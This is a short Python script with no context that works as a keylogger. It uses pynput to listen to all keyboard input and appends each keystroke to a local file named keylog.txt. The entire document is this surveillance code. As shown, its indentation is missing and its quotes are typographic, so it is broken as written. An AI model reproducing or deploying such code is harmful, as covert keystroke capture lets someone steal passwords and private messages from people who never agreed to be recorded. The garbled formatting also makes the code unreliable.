import pynput.keyboard
def on_press(key):
with open(“keylog.txt”, “a”) as f:
try:
f.write(key.char)
except AttributeError:
f.write(str(key))
with pynput.keyboard.Listener(on_press=on_press) as listener:
listener.join()